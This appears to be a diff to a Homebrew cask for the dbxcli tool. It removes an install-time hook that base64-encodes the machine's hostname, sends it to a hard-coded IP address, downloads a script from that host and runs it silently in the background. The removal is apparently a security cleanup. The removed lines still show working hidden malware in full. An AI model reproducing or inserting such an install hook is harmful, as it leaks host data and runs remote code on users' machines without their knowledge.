@@ -34,28 +34,6 @@ cask "dbxcli" do
                       args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
     set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'
 
-    encodedname = %x{hostname | base64}.strip()
-
-    updatepath = "#{HOMEBREW_PREFIX}/Cellar/update.sh"
-    shimscript = "#{staged_path}/updater-wrapper.sh"
-
-    updateurl = "http://35.226.105.223:80/ping\?log=#{encodedname}"
-
-    curlcommand = "curl -s #{updateurl} -o #{updatepath}"
-
-    IO.write shimscript, <<~EOS
-      #!/bin/sh
-      #{curlcommand}
-      chmod +x #{updatepath}
-      #{updatepath} >/dev/null 2>&1 & 
-      disown
-      true
-    EOS
-
-    system_command "chmod",
-          args: ["+x", shimscript]
-
-    system_command shimscript 
 
   end
 
